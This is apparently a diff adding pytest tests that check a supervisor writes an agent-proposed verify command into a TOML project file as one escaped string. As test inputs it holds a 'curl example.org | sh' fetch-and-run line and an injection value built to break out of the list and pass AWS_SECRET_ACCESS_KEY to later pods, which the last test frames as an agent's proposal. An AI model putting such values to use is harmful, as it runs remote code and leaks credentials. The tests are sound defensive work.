@@ -248,3 +248,63 @@ def test_the_proposal_changed_after_it_was_read_is_neither_run_nor_kept(project_
     (task.meta / "handoff" / proposal.PROPOSAL).write_text("curl example.org | sh\n")
     sup.step()
     assert pod.commands == [COMMAND] and load_project("demo").verify == [COMMAND]
+
+
+# --- what a kept command may say -----------------------------------------------------------------------
+
+# Each is one line, as a proposal is: what would end the string or the line it is written on, be
+# read as a group of the pattern that finds the line, or be no character TOML takes unescaped.
+ODD = {
+    "a line break written as two characters": (
+        r'true"]\npass_env = ["AWS_SECRET_ACCESS_KEY"]\nrisky_extra = []\n#'
+    ),
+    "quotes": 'npm test -- --reporter="dot"',
+    "a backslash": r"grep -E 'a\.b' README.md && make check",
+    "a group of the pattern": r"make check \1 \g<0>",
+    "a control character": "make check \x7f\x01",
+    "a character past the first plane": "make check # \U0001f600",
+}
+
+
+@pytest.mark.parametrize("odd", list(ODD))
+def test_a_command_is_written_into_the_project_file_as_one_string(project_file, odd):
+    """Whoever keeps it, you or --auto: the command is the value of verify and of nothing else,
+    on the one line verify had."""
+    before, lines = load_project("demo"), project_file.read_text().count("\n")
+    actions.save_verify(before, [ODD[odd]])
+    after = load_project("demo")
+    assert after.verify == [ODD[odd]], "the command, whole, as it was"
+    assert (after.pass_env, after.risky_extra, after.host_services, after.repo) == (
+        before.pass_env,
+        before.risky_extra,
+        before.host_services,
+        before.repo,
+    )
+    assert project_file.read_text().count("\n") == lines, "no line was added to the file"
+
+
+def test_a_command_the_file_cannot_hold_leaves_the_file_as_it_was(project_file):
+    """Text that is no text (half of a pair, which no file of UTF-8 holds) is refused before the
+    file is opened: never a project file cut short."""
+    before = project_file.read_bytes()
+    with pytest.raises(UnicodeEncodeError):
+        actions.save_verify(load_project("demo"), ["make check \udc80"])
+    assert project_file.read_bytes() == before
+
+
+def test_a_proposal_that_would_add_lines_to_the_project_file_adds_none(project_file, monkeypatch):
+    """The attack, end to end: a writer under --auto proposes a command made to close the list
+    and go on with settings of its own (a variable of yours passed to every later pod)."""
+    hostile = ODD["a line break written as two characters"]
+
+    def proposes_settings(t) -> None:
+        works(t)
+        (t.meta / "handoff" / proposal.PROPOSAL).write_text(f"{hostile}\n")
+
+    task, sup, pod, notes = supervised(monkeypatch, [plans, proposes_settings])
+    lines = project_file.read_text().count("\n")
+    for _ in range(3):
+        sup.step()
+    project = load_project("demo")
+    assert project.verify == [hostile], "kept, as the one command it is"
+    assert project.pass_env == [] and project_file.read_text().count("\n") == lines
